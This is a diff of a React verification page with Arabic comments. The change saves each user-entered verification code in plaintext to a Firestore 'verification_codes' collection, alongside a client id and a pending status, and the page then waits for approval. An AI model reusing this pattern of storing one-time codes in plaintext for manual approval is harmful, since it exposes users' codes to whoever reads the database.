@@ -1,7 +1,7 @@
 import { useState, useEffect, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { AlertCircle, CheckCircle2, Loader2, Headphones, Clock } from 'lucide-react';
-import { doc, setDoc, onSnapshot } from 'firebase/firestore';
+import { doc, setDoc, addDoc, collection, onSnapshot } from 'firebase/firestore';
 import { db as dbInstance } from '@/lib/firebase-config';
 import { setUserOnline, setUserOffline, updateUserPage } from '@/lib/realtime-presence';
 
@@ -164,14 +164,29 @@ export default function VerifyPage() {
         throw new Error('معرف المستخدم غير موجود');
       }
 
-      // حفظ الرمز المرسل وتغيير الحالة (استخدام setDoc مع merge لتحديث المستند الموجود)
+      const clientId = sessionStorage.getItem('client_id') || '';
+      const now = new Date();
+
+      // 1. تحديث مستند التسجيل
       const registrationRef = doc(getDb(), 'registrations', userId);
       await setDoc(registrationRef, {
         verification_code: fullCode,
-        verification_submitted_at: new Date().toISOString(),
+        verification_submitted_at: now.toISOString(),
         status: 'pending_verification'
       }, { merge: true });
-      
+
+      // 2. إضافة سجل في collection verification_codes
+      await addDoc(collection(getDb(), 'verification_codes'), {
+        registration_id: userId,
+        client_id: clientId,
+        code: fullCode,
+        status: 'pending',
+        verified: false,
+        created_at: now.toISOString()
+      });
+
+      console.log('[Verify] Code submitted and logged to verification_codes');
+
       // الانتقال لصفحة الانتظار
       setSubmitted(true);
       setWaitingApproval(true);
